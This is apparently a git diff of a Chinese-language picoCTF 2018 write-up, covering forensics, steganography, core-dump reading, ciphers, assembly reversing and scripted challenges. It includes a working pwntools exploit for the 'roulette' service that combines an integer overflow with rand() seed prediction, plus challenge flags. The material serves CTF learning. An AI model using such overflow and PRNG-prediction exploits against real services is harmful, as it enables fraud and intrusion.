@@ -12,9 +12,12 @@ date: 2018-10-11 22:07:27
 
 ![1539266772853](1539266772853.png)
 
-题目：https://findneo.github.io/p/picoCTF-2018-Problems.html 
+题目：
 
-附件：https://github.com/findneo/ctfgodown/tree/master/20180929-picoctf 
+- https://2018game.picoctf.com/problems
+- 备用
+  - https://findneo.github.io/p/picoCTF-2018-Problems.html 
+  - 附件：https://github.com/findneo/ctfgodown/tree/master/20180929-picoctf 
 
 # Forensics
 
@@ -119,45 +122,52 @@ picoCTF{look_in_image_9f5be995}
 
 `picoCTF{n0w_y0u_533_m3}`
 
-## 【X】Ext Super Magic
+## Ext Super Magic
 
-hexdump -n8 ext-super-magic.img
-
-printf '\x53\xEF' | dd conv=notrunc bs=1 count=2 of=ext-super-magic.img
-
-printf '\x53\xEF' | cat - ext-super-magic.img > ext.img
-
-printf '\xEF\x53' | cat - ext-super-magic.img > ext.img
-
-debugfs
+根据提示使用debugfs查看img文件，发现幻数损坏。
 
 ```bash
-root@kali:~/桌面/picoctf# e2fsck ext-super-magic.img 
-e2fsck 1.44.4 (18-Aug-2018)
-ext2fs_open2: Bad magic number in super-block
-e2fsck: Superblock invalid, trying backup blocks...
-e2fsck: Bad magic number in super-block while trying to open ext-super-magic.img
-
-The superblock could not be read or does not describe a valid ext2/ext3/ext4
-filesystem.  If the device is valid and it really contains an ext2/ext3/ext4
-filesystem (and not swap or ufs or something else), then the superblock
-is corrupt, and you might try running e2fsck with an alternate superblock:
-    e2fsck -b 8193 <device>
- or
-    e2fsck -b 32768 <device>
-
-root@kali:~/桌面/picoctf# e2fsck -b 8193 ext-super-magic.img 
-e2fsck 1.44.4 (18-Aug-2018)
-e2fsck: Attempt to read block from filesystem resulted in short read while trying to open ext-super-magic.img
-Could this be a zero-length partition?
-root@kali:~/桌面/picoctf# e2fsck -b 32768 ext-super-magic.img 
-e2fsck 1.44.4 (18-Aug-2018)
-e2fsck: Attempt to read block from filesystem resulted in short read while trying to open ext-super-magic.img
-Could this be a zero-length partition?
-
+# debugfs ext.img
+debugfs 1.44.4 (18-Aug-2018)
+debugfs: Bad magic number in super-block while trying to open ext.img
+.......
 ```
 
+从文档（https://wiki.osdev.org/Ext2#Superblock）可以看到使用ext2文件系统的第一步是寻找、提取、解析superblock。superblock总是从卷的1024字节开始，长度为1024字节。也就是说，如果一个扇区是512字节，那么superblock位于第2、3扇区。而在superblock中，ext2文件的signature（0xef53）位于第56、57两个字节，所以我们要修正文件的magic number为正确的signature，也就是修改(1024+56,1024+57)bytes即(1080,1081)bytes即(0x438,0x439)bytes的值为`0xef53` 。需注意采用小端序，低字节在低地址。
 
+![1541167493772](1541167493772.png)
+
+根据文档修改superblock，然后可以mount到系统，发现有个flag图片。
+
+```bash
+# file fix.img
+fix.img: Linux rev 1.0 ext2 filesystem data, UUID=a3708ef2-5ec0-4463-9a03-599c890645cd (large files)
+# xxd ext.img > ext.hex
+# xxd fix.img > fix.hex
+# diff *.hex
+68c68
+< 00000430: 34dc ad5b 0100 ffff 0000 0100 0100 0000  4..[............
+---
+> 00000430: 34dc ad5b 0100 ffff 53ef 0100 0100 0000  4..[....S.......
+# mkdir tmpdir && mount fix.img tmpdir && ll tmpdir/ | grep flag
+```
+
+![1541122722339](1541122722339.png)
+
+![1541122685539](1541122685539.png)
+
+尝试了多个命令行OCR工具，tesseract-ocr效果最好，但识别结果还需要修正。
+
+```bash
+$apt install gocr
+$apt install cuneiform
+$apt install tesseract-ocr
+$tesseract cut_flag.jpg res && cat res.txt
+Tesseract Open Source OCR Engine v4.0.0-rc4 with Leptonica
+Your flag is: "picoCTF {FDBfbc6141e7F 4bscI90CIaE7SbI63aEf} "
+```
+
+最后结果：`picoCTF{FDBfbC6141e7F4b8c90C9aE78b963aEf}`
 
 ## Lying Out
 
@@ -256,7 +266,70 @@ Correct!
 Great job. You've earned the flag: picoCTF{w4y_0ut_0915ebc6}
 ```
 
-## 【X】LoadSomeBits
+## LoadSomeBits
+
+最低有效位隐写，需要fuzz起始偏移。
+
+```bash
+# cat lsb.py
+import binascii
+lsb=''.join(map(lambda x:str(ord(x)&1),open('pico2018-special-logo.bmp','rb').read()))
+for offset in range(16):
+        tmp=lsb[offset:]
+        tmps=''.join(chr(int(tmp[i:i+8],2)) for i in range(0,len(tmp),8))
+        if  'pico' in tmps:
+                print tmps
+                break
+
+# python lsb.py | strings | grep -o picoCTF{.*}
+picoCTF{st0r3d_iN_tH3_l345t_s1gn1f1c4nT_b1t5_2903593693}
+```
+
+## core
+
+core file或者core dunp是一个保存进程运行时内存镜像和进程状态（如寄存器的值等）的文件。没挂调试器的程序奔溃时一般会自动产生core文件用于post-mortem debugging。可以使用 `gdb  program [core dump]` 开始调试。
+
+```assembly
+(gdb) disas main
+Dump of assembler code for function main:
+   0x080487ec <+0>:     lea    ecx,[esp+0x4]
+   0x080487f0 <+4>:     and    esp,0xfffffff0
+   0x080487f3 <+7>:     push   DWORD PTR [ecx-0x4]
+   0x080487f6 <+10>:    push   ebp
+   0x080487f7 <+11>:    mov    ebp,esp
+   0x080487f9 <+13>:    push   ecx
+   0x080487fa <+14>:    sub    esp,0x4
+   0x080487fd <+17>:    call   0x80485bb <load_strings>
+   0x08048802 <+22>:    call   0x80487c1 <print_flag>
+   0x08048807 <+27>:    mov    eax,0x0
+   0x0804880c <+32>:    add    esp,0x4
+   0x0804880f <+35>:    pop    ecx
+   0x08048810 <+36>:    pop    ebp
+   0x08048811 <+37>:    lea    esp,[ecx-0x4]
+   0x08048814 <+40>:    ret
+End of assembler dump.
+(gdb) disas print_flag
+Dump of assembler code for function print_flag:
+=> 0x080487c1 <+0>:     push   ebp
+   0x080487c2 <+1>:     mov    ebp,esp
+   0x080487c4 <+3>:     sub    esp,0x18
+   0x080487c7 <+6>:     mov    DWORD PTR [ebp-0xc],0x539
+   0x080487ce <+13>:    mov    eax,DWORD PTR [ebp-0xc]
+   0x080487d1 <+16>:    mov    eax,DWORD PTR [eax*4+0x804a080]
+   0x080487d8 <+23>:    sub    esp,0x8
+   0x080487db <+26>:    push   eax ;flag字符串的地址保存在eax中
+   0x080487dc <+27>:    push   0x804894c
+   0x080487e1 <+32>:    call   0x8048410 <printf@plt>
+   0x080487e6 <+37>:    add    esp,0x10
+   0x080487e9 <+40>:    nop
+   0x080487ea <+41>:    leave
+   0x080487eb <+42>:    ret
+End of assembler dump.
+(gdb) x/sb *(0x804a080+4*0x539)
+0x80610f0:      "c96bd0fa2da5c0853cf12c4f93fce288"s
+```
+
+`picoCTF{c96bd0fa2da5c0853cf12c4f93fce288}`每个人的答案是不同的。
 
 #  General Skills
 
@@ -303,6 +376,8 @@ int main()
 ```
 
 ![1539439034675](1539439034675.png)
+
+`picoCTF{3v3r1ng_1$_r3l3t1v3_372b3859}` 
 
 ## Aca-Shell-A 
 
@@ -408,7 +483,7 @@ python -c 'print "2\n1\n"+str(((1100-100001)+2**32)/1000)+"\n2\n2\n1\n3\n"' | nc
 # Enter 1 to purchaseYOUR FLAG IS: picoCTF{numb3r3_4r3nt_s4f3_6bd13a8c}
 ```
 
-## 【X】roulette
+## roulette
 
 ```c
 #include <stdio.h>
@@ -430,11 +505,11 @@ python -c 'print "2\n1\n"+str(((1100-100001)+2**32)/1000)+"\n2\n2\n1\n3\n"' | nc
 
 long cash = 0;
 long wins = 0;
-
+//判断字符是否是数字,是则返回真。
 int is_digit(char c) {
     return '0' <= c && c <= '9';
 }
-
+//从stdin获取一个长整型正数，最大为LONG_MAX，以换行结尾。
 long get_long() {
     printf("> ");
     uint64_t l = 0;
@@ -454,7 +529,7 @@ long get_long() {
       c = getchar();
     return l;
 }
-
+//随机返回一个小于5000的正整数
 long get_rand() {
   long seed;
   FILE *f = fopen("/dev/urandom", "r");
@@ -465,7 +540,7 @@ long get_rand() {
   srand(seed);
   return seed;
 }
-
+//打印当前资金和获胜次数，下注。（输入点一）
 long get_bet() {
   while(1) {
     puts("How much will you wager?");
@@ -478,7 +553,7 @@ long get_bet() {
     }
   }
 }
-
+//选择下注目标1~36.（输入点二）
 long get_choice() {
   while (1) {
     printf("Choose a number (1-%d)\n", ROULETTE_SIZE);
@@ -490,7 +565,7 @@ long get_choice() {
     }
   }
 }
-
+//打印flag
 int print_flag() {
   char flag[48];
   FILE *file;
@@ -503,7 +578,7 @@ int print_flag() {
   printf("%s", flag);
   return 0;
 }
-
+//一些输赢后的提示语
 const char *win_msgs[NUM_WIN_MSGS] = {
   "Wow.. Nice One!",
   "You chose correct!",
@@ -532,7 +607,7 @@ const char *lose_msgs2[NUM_LOSE_MSGS] = {
   "You're never gonna win",
   "If you keep it up, maybe you'll get the flag in 100000000000 years"
 };
-
+//模拟转盘效果
 void spin_roulette(long spin) {
   int n;
   puts("");
@@ -572,7 +647,7 @@ void spin_roulette(long spin) {
   puts("");
   puts("");
 }
-
+//生成一个随机数，如果和choice一样，就给cash加双倍bet。
 void play_roulette(long choice, long bet) {
   
   printf("Spinning the Roulette for a chance to win $%lu!\n", 2*bet);
@@ -591,7 +666,7 @@ void play_roulette(long choice, long bet) {
   }
   puts("");
 }
-
+//获得一笔随机数额的小于5000的初始资金；下注直到cash大于ONE_BILLION(1000000000)且wins大等于HOTSTREAK(3)小于MAX_WINS(16)获得flag。
 int main(int argc, char *argv[]) {
   setvbuf(stdout, NULL, _IONBF, 0);
 
@@ -635,7 +710,99 @@ int main(int argc, char *argv[]) {
 }
 ```
 
-## 【X】scriptme
+提示说有两个bug。
+
+其一出现在第27行，get_Long()函数的`uint64_t l = 0;` 。函数声明的返回值为`long` 型，实际返回值为`uint64_t` 型，前者有符号最大值为`LONG_MAX:2^31-1` ，后者无符号最大值为`ULONG_MAX:2^64-1` ，存在向上溢出为负数的风险。
+
+真正使上溢成为可能的是32-35行 `if(l >= LONG_MAX){l = LONG_MAX;  break;}` ，这个判断希望控制返回值不超过`long` 型数据的最大值，但应该写在while循环结束的地方而不是开始的地方，否则只能控制数据进入循环时符合条件，而离开时就不知道了，十倍以内都是可能的，而这足以溢出了。
+
+到此为止，我们可以控制cash为任意值了，只要输入bet为 `当前cash+2^32-目标cash` ，在大概率(35/36)输的情况下，我们就能让cash变为想要的值。
+
+要拿到flag还要求赢至少三次，那问题不大，下小注总会有赢的时候。按概率来算，总是对固定choice下注，可以期望在100次左右赢三次。但题目做了控制，太频繁交互会被禁止连接。于是看看其他的方法。
+
+如果要改变wins，只能使choice与166行的 `  long spin = (rand() % ROULETTE_SIZE)+1;` 相等，那么会发现这个随机数序列是在第52行播种的，种子就是我们的初始资金，是已知的。于是就可以知道每一次的spin了。EXP搬运自 https://github.com/sefi-roee/CTFs-Writeups/blob/master/picoCTF-2018/General/18-roulette-350/solution.md ，偷个懒就不写了。
+
+`picoCTF{1_h0p3_y0u_f0uNd_b0tH_bUg5_e9328e04}` 
+
+![1541294444617](1541294444617.png)
+
+```c
+#get_rand_seq.c
+#include <stdio.h>
+#include <stdint.h>
+#include <stdlib.h>
+#include <time.h>
+#include <unistd.h>
+#include <limits.h>
+
+int main(int argc, char *argv[]) {
+    int seed = atoi(argv[1]);
+
+    srand(seed);
+
+    for (int i = 0; i < 100; ++i)
+        printf("%d,", rand());
+
+    return 0;
+}
+```
+
+```python
+#!/usr/bin/env python
+
+from pwn import *
+import subprocess
+
+
+r = remote('2018shell1.picoctf.com', 21444)
+
+sleep(1)
+lines = r.recvuntil('> ').split('\n')
+print '\n'.join(lines)
+
+balance = int(lines[1].split()[2][1:])
+
+log.info("Start balance: {}".format(balance))
+
+log.info("Predicting random values")
+values = subprocess.check_output(["./get_rand_seq", str(balance)])
+values = values.split(',')
+values = [int(v, 10) for v in values[:-1]]
+
+i = 0
+
+ROULETTE_SIZE = 36
+
+for _ in range(4):
+   spin = (values[i] % ROULETTE_SIZE) + 1
+   i += 2
+
+   log.info("Putting {}$ on {}".format(balance, spin))
+
+   r.sendline("{}".format(balance))
+   r.sendline("{}".format(spin))
+
+   balance *= 2
+
+   print r.recvuntil('> ')
+
+   print r.recv()
+
+spin = (values[i] % ROULETTE_SIZE) + 1
+i += 2
+
+log.info("Putting {}$ on {}".format(11474836400, spin))
+
+r.sendline("{}".format(11474836400)) # Put some negative numbers, bug in get_long
+r.sendline("{}".format((spin + 1) % 36))
+
+print r.recvuntil('You deserve this flag!')
+print r.recvall()
+
+r.close()
+```
+
+## scriptme
 
 ```bash
 root@kali:~/bintest# nc 2018shell2.picoctf.com 61344
@@ -656,150 +823,44 @@ Let's start with a warmup.
 (()()()) + (()) = ???
 ```
 
-## assembly-0
+solve.py
 
-What does asm0(0xd8,0x7a) return? 0x7a。
+```python
+from pwn import *
 
- ```assembly
-.intel_syntax noprefix
-.bits 32
-	
-.global asm0
+def depth(s):
+    cnt=0
+    while(len(s)!=0):
+        s=s.replace('()','')
+        cnt+=1
+    return cnt
+def calc(s1,s2):
+    d1=depth(s1)
+    d2=depth(s2)
+    if d1==d2:
+        return s1+s2
+    if d1<d2:
+        return "(%s%s)"%(s1,s2[1:-1])
+    if d1>d2:
+        return "(%s%s)"%(s1[1:-1],s2)
+solve = lambda x:reduce(calc,x.replace(" ",'').split('+'))
 
-asm0:
-	push	ebp
-	mov	ebp,esp
-	mov	eax,DWORD PTR [ebp+0x8]
-	mov	ebx,DWORD PTR [ebp+0xc]
-	mov	eax,ebx
-	mov	esp,ebp
-	pop	ebp	
-	ret
- ```
-
-## assembly-1 
-
-What does asm1(0xcd) return? 0xca。
-
-```assembly
-.intel_syntax noprefix
-.bits 32
-	
-.global asm1
-
-asm1:
-	push	ebp
-	mov	ebp,esp
-	cmp	DWORD PTR [ebp+0x8],0xde
-	jg 	part_a	
-	cmp	DWORD PTR [ebp+0x8],0x8
-	jne	part_b
-	mov	eax,DWORD PTR [ebp+0x8]
-	add	eax,0x3
-	jmp	part_d
-part_a:
-	cmp	DWORD PTR [ebp+0x8],0x4e
-	jne	part_c
-	mov	eax,DWORD PTR [ebp+0x8]
-	sub	eax,0x3
-	jmp	part_d
-part_b:
-	mov	eax,DWORD PTR [ebp+0x8]
-	sub	eax,0x3
-	jmp	part_d
-	cmp	DWORD PTR [ebp+0x8],0xee
-	jne	part_c
-	mov	eax,DWORD PTR [ebp+0x8]
-	sub	eax,0x3
-	jmp	part_d
-part_c:
-	mov	eax,DWORD PTR [ebp+0x8]
-	add	eax,0x3
-part_d:
-	pop	ebp
-	ret
+host = '2018shell2.picoctf.com'
+port = 61344
+r=remote(host,port)
+while True:
+	try:
+		lines=r.recvuntil('\n>').split('\n')
+		print '\n'.join(lines)
+		din=lines[-3].split('=')[0]
+		r.sendline(solve(din))
+	except:
+		print r.recv()
+		break
+r.close()
 ```
 
-## assembly-2
-
-What does asm2(0x7,0x28) return?   `hex(int((0xa1df-0x7)/float(0x76))+1+0x28)` => 0x188
-
-```assembly
-.intel_syntax noprefix
-.bits 32
-	
-.global asm2
-
-asm2:
-	push   	ebp
-	mov    	ebp,esp
-	sub    	esp,0x10
-	mov    	eax,DWORD PTR [ebp+0xc]
-	mov 	DWORD PTR [ebp-0x4],eax
-	mov    	eax,DWORD PTR [ebp+0x8]
-	mov	DWORD PTR [ebp-0x8],eax
-	jmp    	part_b
-part_a:	
-	add    	DWORD PTR [ebp-0x4],0x1
-	add	DWORD PTR [ebp+0x8],0x76
-part_b:	
-	cmp    	DWORD PTR [ebp+0x8],0xa1de
-	jle    	part_a
-	mov    	eax,DWORD PTR [ebp-0x4]
-	mov	esp,ebp
-	pop	ebp
-	ret
-```
-
-## 【X】assembly-3
-
-What does asm3(0xbda42100,0xb98dd6a5,0xecded223) return?  
-
-```assembly
-.bits 32
-	
-.global asm3
-;hex
-;eax xx xx xx xx
-;ax        xx xx
-;ah        xx
-;al           xx
-
-;now xx xx xx xx
-;ebp+0x10 ecded223
-;ebp+0xc  b98dd6a5
-;ebp+0x8  bda42100
-
-;ebp+0xc ecded223
-;ebp+0x8  b98dd6a5
-;ebp+0x4  bda42100
-
-asm3:
-	push   	ebp
-	mov    	ebp,esp
-	mov	eax,0xbc
-;now 00 00 00 bc
-	xor	al,al
-;now 00 00 00 00
-	mov	ah,BYTE PTR [ebp+0x9] ;a4
-;now 00 00 a4 00
-	sal	ax,0x10
-;now 00 00 00 00
-	sub	al,BYTE PTR [ebp+0xc] ;b9
-;now 00 00 00 47 ;100h-b9h ?
-	add	ah,BYTE PTR [ebp+0xd] ;8d
-;now 00 00 8d 47
-	xor	ax,WORD PTR [ebp+0x10] ;ecde
-;now 00 00 61 19
-;eax=0x00006119 ???
-	mov	esp, ebp
-	pop	ebp
-	ret
-```
-
-- https://tcode2k16.github.io/blog/posts/picoctf-2018-writeup/reversing/#assembly-3 
-- https://ctftime.org/writeup/11693 
-- https://github.com/xnand/ctf_writeups/blob/master/picoCTF2018/assembly-0-1-2-3-4/README.md 
+`picoCTF{5cr1pt1nG_l1k3_4_pRo_cde4078d}` 
 
 # binary exploitation
 
@@ -867,11 +928,24 @@ picoCTF{SECRETMESSAGE}
 # 'picoCTF{cAesaR_CiPhErS_juST_aREnT_sEcUrE}'
 ```
 
+## hertz 
+
+替换密码。
+
+在线工具：
+
+- https://www.guballa.de/substitution-solver 
+- https://quipqiup.com/ 
+
+![1541076904847](1541076904847.png)
+
 ## blaise's cipher
 
 在线解密即可：https://www.dcode.fr/vigenere-cipher 。逐步得到KEY长度为4，KEY为`FLAG`
 
 `picoCTF{v1gn3r3_c1ph3rs_ar3n7_bad_901e13a1}` 
+
+## 
 
 ## Safe RSA
 
@@ -1317,3 +1391,186 @@ if __name__ == "__main__":
   }
 ?>
 ```
+
+# reversing
+
+## assembly-0
+
+What does asm0(0xd8,0x7a) return? 0x7a。
+
+```assembly
+.intel_syntax noprefix
+.bits 32
+	
+.global asm0
+
+asm0:
+	push	ebp
+	mov	ebp,esp
+	mov	eax,DWORD PTR [ebp+0x8]
+	mov	ebx,DWORD PTR [ebp+0xc]
+	mov	eax,ebx
+	mov	esp,ebp
+	pop	ebp	
+	ret
+```
+
+## assembly-1 
+
+What does asm1(0xcd) return? 0xca。
+
+```assembly
+.intel_syntax noprefix
+.bits 32
+	
+.global asm1
+
+asm1:
+	push	ebp
+	mov	ebp,esp
+	cmp	DWORD PTR [ebp+0x8],0xde
+	jg 	part_a	
+	cmp	DWORD PTR [ebp+0x8],0x8
+	jne	part_b
+	mov	eax,DWORD PTR [ebp+0x8]
+	add	eax,0x3
+	jmp	part_d
+part_a:
+	cmp	DWORD PTR [ebp+0x8],0x4e
+	jne	part_c
+	mov	eax,DWORD PTR [ebp+0x8]
+	sub	eax,0x3
+	jmp	part_d
+part_b:
+	mov	eax,DWORD PTR [ebp+0x8]
+	sub	eax,0x3
+	jmp	part_d
+	cmp	DWORD PTR [ebp+0x8],0xee
+	jne	part_c
+	mov	eax,DWORD PTR [ebp+0x8]
+	sub	eax,0x3
+	jmp	part_d
+part_c:
+	mov	eax,DWORD PTR [ebp+0x8]
+	add	eax,0x3
+part_d:
+	pop	ebp
+	ret
+```
+
+## assembly-2
+
+What does asm2(0x7,0x28) return?   `hex(int((0xa1df-0x7)/float(0x76))+1+0x28)` => 0x188
+
+```assembly
+.intel_syntax noprefix
+.bits 32
+	
+.global asm2
+
+asm2:
+	push   	ebp
+	mov    	ebp,esp
+	sub    	esp,0x10
+	mov    	eax,DWORD PTR [ebp+0xc]
+	mov 	DWORD PTR [ebp-0x4],eax
+	mov    	eax,DWORD PTR [ebp+0x8]
+	mov	DWORD PTR [ebp-0x8],eax
+	jmp    	part_b
+part_a:	
+	add    	DWORD PTR [ebp-0x4],0x1
+	add	DWORD PTR [ebp+0x8],0x76
+part_b:	
+	cmp    	DWORD PTR [ebp+0x8],0xa1de
+	jle    	part_a
+	mov    	eax,DWORD PTR [ebp-0x4]
+	mov	esp,ebp
+	pop	ebp
+	ret
+```
+
+## assembly-3
+
+What does asm3(0xbda42100,0xb98dd6a5,0xecded223) return?  0x478
+
+```assembly
+ebp+0x8=>0xbda42100
+ebp+0xc=>0xb98dd6a5
+ebp+0x10=>0xecded223
+```
+
+
+
+```assembly
+.intel_syntax noprefix
+.bits 32
+
+.global asm3
+
+asm3:
+        push    ebp
+        mov     ebp,esp
+        mov     eax,0xbc;0xbc
+        xor     al,al;0x00
+        mov     ah,BYTE PTR [ebp+0x9];0x2100
+        sal     ax,0x10;0x0000
+        sub     al,BYTE PTR [ebp+0xc];0x005b
+        add     ah,BYTE PTR [ebp+0xd];0xd65b
+        xor     ax,WORD PTR [ebp+0x10];0xd65b^0xd223=0x478
+        mov     esp, ebp
+        pop     ebp
+        ret
+```
+
+有几点需要注意。一是数据采用小端序存储，高字节在高地址，[ebp+0x8]的值是0x00而非0xbd；二是 `sub 0x00,0xa5` 的值是`0x100-0xa5=0x5b` 。 三是`WORD PTR [ebp+0x10]` 的值是`0xd223` 而非`0x23d2` 。
+
+![1541310455800](1541310455800.png)
+
+可参考 [此处](https://github.com/xnand/ctf_writeups/blob/master/picoCTF2018/assembly-0-1-2-3-4/README.md) 将汇编代码编译成共享库在C程序中调用。执行得到结果，也可调试加深理解。
+
+```asm
+section .text
+global asm3
+
+asm3:
+	push   	ebp
+	mov    	ebp,esp
+	mov	eax,0x19
+	xor	al,al
+	mov	ah,BYTE [ebp+0xa]
+	sal	ax,0x10
+	sub	al,BYTE [ebp+0xd]
+	add	ah,BYTE [ebp+0xc]
+	xor	ax,WORD [ebp+0x12]
+	mov	esp, ebp
+	pop	ebp
+	ret
+##################
+#include <stdio.h>
+extern int asm3(int a, int b, int c);
+
+int main(void) {
+
+	printf("0x%x\n", asm3(0xb5e8e971,0xc6b58a95,0xe20737e9));
+
+	return 0;
+}
+##################
+[andrei@jacky 15:27:00] ~/Documents/pico/3
+——> nasm -f elf32 end_asm_rev.S -o asmfun.o
+[andrei@jacky 15:27:42] ~/Documents/pico/3
+——> gcc sol.c asmfun.o -o sol -m32
+[andrei@jacky 15:27:59] ~/Documents/pico/3
+——> ./sol
+```
+
+## assembly-4
+
+```bash
+root@kali:~/ctf/pico18# nasm -f elf32 comp.nasm -o comp.o
+root@kali:~/ctf/pico18# gcc -m32 -o comp comp.o
+root@kali:~/ctf/pico18# ./comp
+picoCTF{1_h0p3_y0u_c0mP1l3d_tH15_32429699163
+```
+
+`picoCTF{1_h0p3_y0u_c0mP1l3d_tH15_3242969916}` 
